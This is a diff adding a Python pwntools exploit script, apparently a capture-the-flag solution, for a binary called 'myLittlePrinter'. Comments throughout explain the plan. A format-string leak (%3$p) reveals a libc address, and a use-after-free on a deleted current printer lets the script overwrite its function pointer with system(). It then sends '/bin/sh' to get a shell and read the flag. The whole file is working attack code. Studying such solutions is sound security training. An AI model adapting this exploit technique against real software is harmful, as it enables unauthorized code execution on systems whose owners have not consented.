@@ -1,0 +1,96 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from time import sleep
+
+exe = context.binary = ELF("./myLittlePrinter", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["/mnt/d/Programs/wsl-terminal/open-wsl.exe", "-e"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=True, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def exec_fmt(payload):
+    io.recvuntil(">> ")
+    io.sendline('6')
+    io.recvuntil(': ')
+    io.sendline(payload)
+    return io.recvuntil("***")
+
+
+def main():
+    global io
+    io = start()
+
+    # grabbing some offsets in libc again...
+    system_addr_base = 0x7ffff7e37120
+    some_addr_base = 0x7ffff7edd1f7
+    offset = system_addr_base - some_addr_base
+    
+    # our exploit is based on the following line in the print section:
+    # (*current_printer->print_function)(buffer);
+    # all we want to do is write "/bin/sh" into the buffer, and change the print_function to system
+    # the security vulnurability in this binary is a possible dangling pointer:
+    # if a printer is deleted, the allocated memory is free'd
+    # if the deleted printer though is at the time of deletion set as the CURRENT printer, then there still is a pointer onto the deleted printer.
+    # more importantly, if we call the print functionality, then the program will call the deleted printer
+    # since we can write (within limited bounds) whatever we want by creating a new user, our plan is easy:
+
+    # create new printer
+    io.recvuntil(">> ")
+    io.sendline('1')
+    # chose plain so we can exploit fmtstr
+    io.sendline('2')
+    leak = io.recvuntil("***").split()[-2]
+
+    # set printer as current
+    io.recvuntil(">> ")
+    io.sendline('3')
+    io.sendline('0')
+
+    # grab an addr in libc:
+    # a bit of bash-fu lead to the discovery of %3$p as a libc addr
+    out = exec_fmt("%3$p").split()[0]
+    some_addr = int(out, base=16)
+    system_addr = some_addr + offset
+    
+    # delete printer
+    io.recvuntil(">> ")
+    io.sendline('2')
+    io.sendline('0')
+
+    # create a user <system_addr> to overwrite the pointee of the dangling pointer
+    io.recvuntil(">> ")
+    io.sendline('4')
+    io.recvuntil("user: ")
+    # this prevents some errors that occur from system 
+    # falling on whitespace-equiv addresses
+    if (system_addr & 0xFF) in [0x20, 0x0a, 0x00]: 
+        system_addr += 4
+    io.sendline(struct.pack("<Q", system_addr))
+
+    # send /bin/sh as message
+    io.recvuntil(">> ")
+    io.sendline('6')
+    io.recvuntil(': ')
+    io.sendline('/bin/sh')
+    sleep(0.5)
+
+    # now that we have a shell
+    io.sendline('cat flag.txt')
+    print(io.recvuntil("}").decode("utf-8"))
+
+if __name__ == "__main__":
+    main()
